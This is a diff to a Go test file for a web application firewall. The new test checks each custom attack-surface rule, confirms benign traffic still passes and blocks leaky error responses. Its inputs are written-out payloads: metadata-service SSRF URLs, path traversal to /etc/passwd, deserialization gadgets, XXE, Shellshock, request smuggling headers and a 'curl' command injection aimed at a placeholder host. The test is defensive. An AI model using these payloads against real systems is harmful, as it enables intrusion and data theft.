@@ -159,6 +159,33 @@ func wafEngine(t *testing.T, files ...string) *waf.Engine {
 	return e
 }
 
+// wafEngineBare compiles rule files without the Core Rule Set, so a
+// test can prove which of the file's own rules refused a request. With
+// the CRS loaded, its rules run first and a custom rule that no longer
+// matches would never be noticed.
+func wafEngineBare(t *testing.T, files ...string) *waf.Engine {
+	t.Helper()
+	abs := make([]string, 0, len(files))
+	for _, f := range files {
+		abs = append(abs, filepath.Join(root(t), "waf", f))
+	}
+	cfg := &config.WAF{
+		Profiles:               []config.WAFProfile{{Name: "default", DirectiveFiles: abs}},
+		DefaultMode:            "block",
+		DefaultProfile:         "default",
+		RequestBodyLimit:       65536,
+		RequestBodyLimitAction: "reject",
+		InspectResponses:       true,
+		ResponseBodyLimit:      65536,
+		ResponseMIMETypes:      []string{"text/html", "text/plain", "application/json"},
+	}
+	e, err := waf.New(cfg, waf.Need{"default": {waf.ModeBlock: true}}, nil, nolog)
+	if err != nil {
+		t.Fatalf("compile %v: %v", files, err)
+	}
+	return e
+}
+
 func wafRequest(t *testing.T, e *waf.Engine, r *http.Request) filter.Verdict {
 	t.Helper()
 	f, err := e.Filter("default", waf.ModeBlock)
@@ -354,6 +381,169 @@ func TestWAFHardeningRules(t *testing.T) {
 		in := f.Begin(context.Background(), &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Route: "r", Host: "www.example.com", Path: "/"})
 		in.Request(get("/"))
 		resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"application/json"}},
+			Body: io.NopCloser(strings.NewReader(c.body))}
+		v := in.Response(resp)
+		in.End()
+		if v.Deny != c.deny {
+			t.Errorf("response %s: %+v, want deny=%v", c.name, v, c.deny)
+		}
+	}
+}
+
+// TestWAFAttackSurfaceRules compiles the third custom rule file and
+// puts one request through every rule in it, then the traffic that
+// must still pass. These rules refuse shapes rather than payloads, so
+// the false-positive cases matter as much as the matches.
+func TestWAFAttackSurfaceRules(t *testing.T) {
+	e := wafEngine(t, "attack-surface-rules.conf")
+	bare := wafEngineBare(t, "attack-surface-rules.conf")
+	get := func(path string, hdr ...string) *http.Request {
+		r := httptest.NewRequest("GET", "http://www.example.com"+path, nil)
+		r.Header.Set("User-Agent", "Mozilla/5.0")
+		for i := 0; i+1 < len(hdr); i += 2 {
+			r.Header.Set(hdr[i], hdr[i+1])
+		}
+		return r
+	}
+	post := func(path, ctype, body string, hdr ...string) *http.Request {
+		r := httptest.NewRequest("POST", "http://www.example.com"+path, strings.NewReader(body))
+		r.Header.Set("Content-Type", ctype)
+		r.Header.Set("Content-Length", fmt.Sprint(len(body)))
+		r.Header.Set("User-Agent", "Mozilla/5.0")
+		for i := 0; i+1 < len(hdr); i += 2 {
+			r.Header.Set(hdr[i], hdr[i+1])
+		}
+		return r
+	}
+	form := func(name, value string, hdr ...string) *http.Request {
+		return post("/submit", "application/x-www-form-urlencoded", url.Values{name: {value}}.Encode(), hdr...)
+	}
+	upload := func(filename, ctype string) *http.Request {
+		body := "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"" + filename + "\"\r\n" +
+			"Content-Type: " + ctype + "\r\n\r\nx\r\n--b--\r\n"
+		return post("/upload", "multipart/form-data; boundary=b", body)
+	}
+	arg := func(v string) *http.Request { return get("/fetch?target=" + url.QueryEscape(v)) }
+	// Each case names the rule it must trip. Asserting only "denied"
+	// would pass on a CRS rule that happened to catch the same request,
+	// which is how a custom rule rots without anyone noticing. Each
+	// request is built twice, because the first engine reads its body.
+	for _, c := range []struct {
+		id   string
+		name string
+		mk   func() *http.Request
+	}{
+		{"22001", "imds address", func() *http.Request { return arg("http://169.254.169.254/latest/meta-data/") }},
+		{"22001", "google metadata name", func() *http.Request { return arg("http://metadata.google.internal/computeMetadata/v1/") }},
+		{"22002", "file scheme", func() *http.Request { return arg("file:///etc/hostname") }},
+		{"22002", "gopher scheme", func() *http.Request { return arg("gopher://10.0.0.1:6379/_INFO") }},
+		{"22003", "system file", func() *http.Request { return arg("../../etc/passwd") }},
+		{"22003", "proc self environ", func() *http.Request { return arg("/proc/self/environ") }},
+		{"22004", "stream wrapper", func() *http.Request { return arg("php://filter/convert.base64-encode/resource=index.php") }},
+		{"22005", "java object", func() *http.Request { return form("state", "rO0ABXNyABFqYXZh") }},
+		{"22006", "php object", func() *http.Request { return form("u", `O:8:"Example":1:{s:4:"path";s:6:"/etc/x";}`) }},
+		{"22007", "yaml object tag", func() *http.Request { return form("value", "!!python/object/apply:os.system [id]") }},
+		{"22008", "external entity", func() *http.Request {
+			return post("/soap", "application/xml",
+				`<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "http://x.example.invalid/e">]><d>&x;</d>`)
+		}},
+		{"22009", "operator parameter name", func() *http.Request { return get("/users?%24where=1") }},
+		{"22010", "executing operator in json", func() *http.Request {
+			return post("/api/search", "application/json", `{"$where":"this.a==1"}`)
+		}},
+		{"22011", "shell command", func() *http.Request { return arg("x; curl http://drop.example.invalid/a ") }},
+		{"22013", "spel header", func() *http.Request {
+			return get("/", "spring.cloud.function.routing-expression", "T(java.lang.Runtime)")
+		}},
+		{"22014", "shellshock", func() *http.Request { return get("/", "X-Api-Version", "() { :; }; echo vulnerable") }},
+		{"22015", "obfuscated transfer encoding", func() *http.Request { return get("/", "Transfer-Encoding", "chunked, chunked") }},
+		{"22016", "framing headers together", func() *http.Request { return form("a", "1", "Transfer-Encoding", "chunked") }},
+		{"22017", "override header", func() *http.Request { return get("/", "X-Original-URL", "/admin") }},
+		{"22017", "forwarded host", func() *http.Request { return get("/", "X-Forwarded-Host", "attacker.example.invalid") }},
+		{"22018", "cache deception", func() *http.Request { return get("/account/settings.css") }},
+		{"22019", "prototype pollution", func() *http.Request { return form("__proto__[x]", "1") }},
+		{"22020", "header injection", func() *http.Request { return get("/redirect?to=%0d%0aSet-Cookie%3A%20a%3Db") }},
+		{"22022", "debugger parameter", func() *http.Request { return get("/?XDEBUG_SESSION_START=1") }},
+		{"22023", "browser executing upload", func() *http.Request { return upload("logo.svg", "image/svg+xml") }},
+		{"22024", "scanner user agent", func() *http.Request {
+			return get("/", "User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")
+		}},
+		{"22025", "write without a user agent", func() *http.Request {
+			r := httptest.NewRequest("POST", "http://www.example.com/api/orders", strings.NewReader(`{"id":1}`))
+			r.Header.Set("Content-Type", "application/json")
+			r.Header.Set("Content-Length", "8")
+			return r
+		}},
+	} {
+		v := wafRequest(t, bare, c.mk())
+		if !v.Deny {
+			t.Errorf("%s (%s): %+v, want a deny", c.name, c.id, v)
+			continue
+		}
+		if !matchedRule(v, c.id) {
+			t.Errorf("%s: denied by %v, want rule %s among them", c.name, attr(v, "waf_matched"), c.id)
+		}
+		// And the same request is still refused with the CRS loaded,
+		// whichever of the two gets to it first.
+		if v := wafRequest(t, e, c.mk()); !v.Deny {
+			t.Errorf("%s: passed with the CRS loaded: %+v", c.name, v)
+		}
+	}
+	// Two rules score rather than refuse: an absolute return-to link
+	// and a parenthesised expression are both things a legitimate
+	// client sends, so the CRS threshold decides together with
+	// everything else the request did. Without the CRS there is no
+	// threshold, which is where a `pass` rule proves it is one.
+	for _, r := range []*http.Request{
+		get("/login?next=https%3A%2F%2Fwww.example.com%2Faccount"),
+		get("/quote?amount=%24%2812%29"),
+	} {
+		if v := wafRequest(t, bare, r); v.Deny {
+			t.Errorf("a scoring rule refused on its own: %s: %+v", r.URL, v)
+		}
+	}
+	// The absolute link is still not a refusal with the CRS loaded: it
+	// is one signal, and one signal is under the threshold.
+	if v := wafRequest(t, e, get("/login?next=https%3A%2F%2Fwww.example.com%2Faccount")); v.Deny {
+		t.Errorf("the redirect rule denied on its own: %+v", v)
+	}
+	// Traffic these rules must not touch. Each one is a shape close
+	// enough to a rule above to be worth proving.
+	for _, c := range []struct {
+		name string
+		r    *http.Request
+	}{
+		{"an ordinary page", get("/products?page=2&sort=price")},
+		{"a static asset", get("/assets/app.1a2b3c.js")},
+		{"a form post with neither framing header spelled oddly", form("comment", "hello")},
+		{"an https url parameter", arg("https://cdn.example.com/logo.png")},
+		{"a path that mentions a private word", get("/blog/my-account-settings")},
+		{"an image upload", upload("logo.png", "image/png")},
+		{"a library user agent", get("/api/health", "User-Agent", "example-client/2.1 (+https://example.com)")},
+		{"a semicolon in prose", form("body", "first; second; and a third")},
+	} {
+		if v := wafRequest(t, e, c.r); v.Deny {
+			t.Errorf("%s was denied: %+v", c.name, v)
+		}
+	}
+	// The response rules.
+	for _, c := range []struct {
+		name string
+		body string
+		deny bool
+	}{
+		{"python traceback", "Traceback (most recent call last):\n  File \"/srv/app.py\", line 42", true},
+		{"php warning", `<b>Warning</b>: include(/var/www/config.php): failed to open stream`, true},
+		{"directory listing", "<html><head><title>Index of /backups</title></head>", true},
+		{"an ordinary page", `{"items":[{"id":1,"name":"widget"}]}`, false},
+	} {
+		f, err := e.Filter("default", waf.ModeBlock)
+		if err != nil {
+			t.Fatal(err)
+		}
+		in := f.Begin(context.Background(), &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Route: "r", Host: "www.example.com", Path: "/"})
+		in.Request(get("/"))
+		resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"text/html"}},
 			Body: io.NopCloser(strings.NewReader(c.body))}
 		v := in.Response(resp)
 		in.End()
@@ -741,4 +931,20 @@ func TestWasmPolicy(t *testing.T) {
 	if !found {
 		t.Fatalf("log attribute missing: %v", attrs)
 	}
+}
+
+// attr returns one attribute a filter verdict carries, or nil.
+func attr(v filter.Verdict, name string) any {
+	for i := 0; i+1 < len(v.Attrs); i += 2 {
+		if s, ok := v.Attrs[i].(string); ok && s == name {
+			return v.Attrs[i+1]
+		}
+	}
+	return nil
+}
+
+// matchedRule reports whether a WAF verdict names this rule id among
+// the rules that matched.
+func matchedRule(v filter.Verdict, id string) bool {
+	return strings.Contains(fmt.Sprint(attr(v, "waf_matched")), id)
 }
